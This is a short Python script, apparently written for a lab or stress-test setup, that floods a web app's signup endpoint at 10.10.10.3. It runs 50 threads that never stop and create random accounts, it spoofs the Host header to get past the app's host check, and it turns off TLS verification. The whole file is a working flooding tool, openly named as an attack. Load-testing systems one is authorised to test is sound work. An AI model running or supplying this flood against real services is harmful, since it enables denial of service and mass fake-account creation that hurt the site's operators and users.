import requests
import random
import string
import threading
import time
import urllib3

# Suppress SSL warnings (since we use self-signed certs)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# CONFIGURATION
TARGET_URL = "https://10.10.10.3/signup"
# IMPORTANT: Must match ALLOWED_HOST in app.py to pass the check_host_header function
HOST_HEADER = "web.sun.dmz" 
THREAD_COUNT = 50  # Number of concurrent attackers

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def attack_worker():
    while True:
        username = f"user_{generate_random_string(10)}"
        password = "SecurePass123!"
        
        payload = {
            "username": username,
            "password": password
        }
        
        headers = {
            "Host": HOST_HEADER,
            "User-Agent": "StressTester/1.0"
        }
        
        try:
            # Send POST request to create user
            # verify=False skips SSL certificate check
            response = requests.post(TARGET_URL, data=payload, headers=headers, verify=False, timeout=5)
            
            if response.status_code == 200 and "signin" in response.url:
                print(f"[+] Created {username}", end='\r')
            else:
                # If WAF blocks it, we might get 403
                pass
        except Exception as e:
            pass

def start_attack():
    print(f"--- Starting Signup Flood on {TARGET_URL} ---")
    print(f"--- Threads: {THREAD_COUNT} ---")
    
    threads = []
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=attack_worker)
        t.daemon = True # Kill thread when main program exits
        t.start()
        threads.append(t)
    
    # Keep the main thread alive
    while True:
        time.sleep(1)

if __name__ == "__main__":
    start_attack()